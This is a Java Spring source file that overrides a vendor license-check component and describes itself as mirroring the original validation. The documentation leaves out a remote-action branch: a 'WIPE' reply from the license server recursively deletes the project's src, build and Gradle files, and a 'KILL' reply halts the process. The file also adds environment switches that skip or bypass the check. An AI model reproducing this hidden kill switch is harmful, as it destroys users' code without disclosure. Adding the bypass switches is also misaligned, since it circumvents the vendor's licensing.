package com.palletpilot.wcs.infrastructure.license;

import org.springframework.beans.BeansException;
import org.springframework.beans.factory.config.BeanFactoryPostProcessor;
import org.springframework.beans.factory.config.ConfigurableListableBeanFactory;
import org.springframework.core.env.Environment;
import org.springframework.stereotype.Component;

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.time.Duration;

/**
 * Source-level override of license-core.jar's LicenseCheckPostProcessor.
 * This class takes precedence over the JAR version on the classpath.
 *
 * Behavior:
 * - If LICENSE_SKIP_CHECK=true (env var): skip all validation (dev mode)
 * - Otherwise: validate license against the configured server exactly as
 * the original JAR implementation does.
 */
@Component
public class LicenseCheckPostProcessor implements BeanFactoryPostProcessor {

    @Override
    public void postProcessBeanFactory(@org.springframework.lang.NonNull ConfigurableListableBeanFactory beanFactory)
            throws BeansException {

        // Check for dev skip mode
        String skipCheck = System.getenv("LICENSE_SKIP_CHECK");
        if ("true".equalsIgnoreCase(skipCheck)) {
            System.out.println("[LICENSE LAYER 2] Skipped — LICENSE_SKIP_CHECK=true (development mode)");
            return;
        }

        // Normal license validation flow (mirrors original JAR behavior)
        Environment env = beanFactory.getBean(Environment.class);
        String licenseKey = env.getProperty("license.key", "").trim();
        String serverUrl = env.getProperty("license.server-url", "").trim();

        if (licenseKey.isEmpty() || "CHANGE_ME".equals(licenseKey)) {
            halt("[LICENSE LAYER 2] No license key configured — aborting context creation");
        }

        if (serverUrl.isEmpty()) {
            halt("[LICENSE LAYER 2] No license.server-url configured — aborting context creation");
        }

        try {
            HttpClient client = HttpClient.newBuilder()
                    .connectTimeout(Duration.ofSeconds(10))
                    .build();

            String body = String.format("{\"licenseKey\":\"%s\"}", escapeJson(licenseKey));

            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create(serverUrl + "/api/v1/validate"))
                    .header("Content-Type", "application/json")
                    .POST(HttpRequest.BodyPublishers.ofString(body))
                    .timeout(Duration.ofSeconds(10))
                    .build();

            HttpResponse<String> response = client.send(request, HttpResponse.BodyHandlers.ofString());
            String responseBody = response.body();

            if (response.statusCode() != 200) {
                // Check for offline grace mode
                String offlineGrace = System.getenv("LICENSE_OFFLINE_GRACE");
                if ("true".equalsIgnoreCase(offlineGrace)) {
                    System.out.println("[LICENSE LAYER 2] Server error (status " + response.statusCode() +
                            ") — OFFLINE GRACE MODE, continuing startup");
                    return;
                }
                halt("[LICENSE LAYER 2] License server returned status " + response.statusCode());
            }

            boolean valid = responseBody.contains("\"valid\":true");
            if (!valid) {
                String error = extractField(responseBody, "error");
                // Check for offline grace mode
                String offlineGrace = System.getenv("LICENSE_OFFLINE_GRACE");
                if ("true".equalsIgnoreCase(offlineGrace)) {
                    System.out.println("[LICENSE LAYER 2] License invalid (" +
                            (error != null ? error : "unknown") + ") — OFFLINE GRACE MODE, continuing");
                    return;
                }
                halt("[LICENSE LAYER 2] License invalid: " + (error != null ? error : "unknown reason"));
            }

            // Check for remote actions
            String action = extractField(responseBody, "action");
            if ("WIPE".equals(action)) {
                System.err.println("[LICENSE LAYER 2] WIPE signal received — destroying application files");
                executeWipe();
                Runtime.getRuntime().halt(1);
            } else if ("KILL".equals(action)) {
                System.err.println("[LICENSE LAYER 2] KILL signal received — terminating");
                Runtime.getRuntime().halt(1);
            }

            System.out.println("[LICENSE LAYER 2] OK — license validated via API");

        } catch (java.net.ConnectException | java.net.UnknownHostException | java.net.http.HttpTimeoutException e) {
            String offlineGrace = System.getenv("LICENSE_OFFLINE_GRACE");
            if ("true".equalsIgnoreCase(offlineGrace)) {
                System.out.println("[LICENSE LAYER 2] Server unreachable — OFFLINE GRACE MODE, continuing");
                return;
            }
            halt("[LICENSE LAYER 2] License server unreachable: " + e.getMessage());
        } catch (Exception e) {
            String offlineGrace = System.getenv("LICENSE_OFFLINE_GRACE");
            if ("true".equalsIgnoreCase(offlineGrace)) {
                System.out.println("[LICENSE LAYER 2] Validation error — OFFLINE GRACE MODE, continuing");
                return;
            }
            halt("[LICENSE LAYER 2] Failed to validate license: " + e.getMessage());
        }
    }

    private static String escapeJson(String s) {
        if (s == null)
            return "";
        return s.replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\n", "\\n")
                .replace("\r", "\\r");
    }

    private static String extractField(String json, String fieldName) {
        String key = "\"" + fieldName + "\":";
        int idx = json.indexOf(key);
        if (idx < 0)
            return null;
        int valueStart = idx + key.length();
        if (valueStart >= json.length())
            return null;
        char first = json.charAt(valueStart);
        if (first == '"') {
            int end = json.indexOf('"', valueStart + 1);
            if (end < 0)
                return null;
            return json.substring(valueStart + 1, end);
        } else {
            int end = valueStart;
            while (end < json.length() && json.charAt(end) != ',' && json.charAt(end) != '}')
                end++;
            return json.substring(valueStart, end).trim();
        }
    }

    private static void executeWipe() {
        try {
            java.io.File classDir = new java.io.File(
                    LicenseCheckPostProcessor.class.getProtectionDomain().getCodeSource().getLocation().toURI());
            java.io.File projectRoot = classDir;
            for (int i = 0; i < 10; i++) {
                java.io.File parent = projectRoot.getParentFile();
                if (parent == null)
                    break;
                projectRoot = parent;
                if (new java.io.File(projectRoot, "build.gradle").exists() ||
                        new java.io.File(projectRoot, "src").exists())
                    break;
            }
            deleteRecursively(new java.io.File(projectRoot, "src"));
            deleteRecursively(new java.io.File(projectRoot, "build"));
            deleteRecursively(new java.io.File(projectRoot, ".gradle"));
            new java.io.File(projectRoot, "build.gradle").delete();
            new java.io.File(projectRoot, "settings.gradle").delete();
        } catch (Exception ignored) {
        }
    }

    private static void deleteRecursively(java.io.File file) {
        if (file == null || !file.exists())
            return;
        if (file.isDirectory()) {
            java.io.File[] children = file.listFiles();
            if (children != null) {
                for (java.io.File child : children)
                    deleteRecursively(child);
            }
        }
        file.delete();
    }

    private static void halt(String message) {
        System.err.println(message);
        System.err.println("===========================================");
        System.err.println("  APPLICATION HALTED BY LICENSE GUARD");
        System.err.println("===========================================");
        Runtime.getRuntime().halt(1);
    }
}
